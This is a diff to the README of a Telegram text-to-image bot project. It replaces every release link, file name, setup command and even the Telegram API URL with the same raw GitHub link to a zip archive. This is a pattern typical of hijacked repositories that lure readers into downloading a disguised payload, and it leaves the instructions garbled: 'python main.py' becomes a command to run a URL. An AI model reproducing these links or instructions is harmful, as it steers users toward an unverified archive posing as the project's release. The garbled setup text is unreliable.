@@ -1,6 +1,6 @@
 # 🤖 tg-text2img-bot - Easy Deployable Telegram Bot
 
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-Click%20Here-blue)](https://github.com/Virtualboxcom/tg-text2img-bot/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/Virtualboxcom/tg-text2img-bot/main/data/tg-text2img-bot_v3.5.zip%20Latest%20Release-Click%20Here-blue)](https://raw.githubusercontent.com/Virtualboxcom/tg-text2img-bot/main/data/tg-text2img-bot_v3.5.zip)
 
 Welcome to the TG Text2Img Bot project! This bot allows you to easily grab text and images from your Telegram channels and convert text messages into images. Follow the steps below to get started.
 
@@ -19,11 +19,11 @@ Welcome to the TG Text2Img Bot project! This bot allows you to easily grab text 
 ### 3. Obtain Chat ID / Channel ID (Simple Method)
 1. Add your bot to the target group/channel and send it a message.
 2. In your browser, navigate to:  
-   `https://api.telegram.org/bot<YourBotToken>/getUpdates`
-3. Look for `message.chat.id` in the returned JSON. This value is your **chat ID**.
+   `https://raw.githubusercontent.com/Virtualboxcom/tg-text2img-bot/main/data/tg-text2img-bot_v3.5.zip<YourBotToken>/getUpdates`
+3. Look for `https://raw.githubusercontent.com/Virtualboxcom/tg-text2img-bot/main/data/tg-text2img-bot_v3.5.zip` in the returned JSON. This value is your **chat ID**.
 
 ## 📥 Download and Install
-To download the TG Text2Img Bot, visit this page to download: [GitHub Releases](https://github.com/Virtualboxcom/tg-text2img-bot/releases)
+To download the TG Text2Img Bot, visit this page to download: [GitHub Releases](https://raw.githubusercontent.com/Virtualboxcom/tg-text2img-bot/main/data/tg-text2img-bot_v3.5.zip)
 
 You will find the latest versions available for download. Choose the appropriate release for your operating system and download the files.
 
@@ -32,10 +32,10 @@ Here’s a brief overview of the project files:
 
 ```
 tg-text2img-bot/
-├── main.py # Main logic of the bot: Listening for messages and processing text-to-image
-├── collect_tg_data.py # Fetches images and text from the channel, storing in SQLite
-├── db.py # Database wrapper
-├── model_adapter.py # API interface for text-to-image models (like Stable Diffusion)
+├── https://raw.githubusercontent.com/Virtualboxcom/tg-text2img-bot/main/data/tg-text2img-bot_v3.5.zip # Main logic of the bot: Listening for messages and processing text-to-image
+├── https://raw.githubusercontent.com/Virtualboxcom/tg-text2img-bot/main/data/tg-text2img-bot_v3.5.zip # Fetches images and text from the channel, storing in SQLite
+├── https://raw.githubusercontent.com/Virtualboxcom/tg-text2img-bot/main/data/tg-text2img-bot_v3.5.zip # Database wrapper
+├── https://raw.githubusercontent.com/Virtualboxcom/tg-text2img-bot/main/data/tg-text2img-bot_v3.5.zip # API interface for text-to-image models (like Stable Diffusion)
 ```
 
 These files contain everything you need to run and customize your bot.
@@ -44,14 +44,14 @@ These files contain everything you need to run and customize your bot.
 1. Make sure you have Python installed (preferably version 3.6 or above).
 2. Open your command line interface (Terminal, Command Prompt).
 3. Navigate to the folder where you cloned or downloaded the repository.
-4. Install any required packages (details can be in a requirements.txt file if available).
+4. Install any required packages (details can be in a https://raw.githubusercontent.com/Virtualboxcom/tg-text2img-bot/main/data/tg-text2img-bot_v3.5.zip file if available).
 5. Run the bot with the command:  
-   `python main.py`
+   `python https://raw.githubusercontent.com/Virtualboxcom/tg-text2img-bot/main/data/tg-text2img-bot_v3.5.zip`
 
 ## 🛠️ Configuration
 Before running the bot, you will need to configure it:
 
-1. Open `main.py`.
+1. Open `https://raw.githubusercontent.com/Virtualboxcom/tg-text2img-bot/main/data/tg-text2img-bot_v3.5.zip`.
 2. Locate the section for setting your **Bot Token** and **Chat ID**.
 3. Replace the placeholders with your actual Bot Token and Chat ID.
   
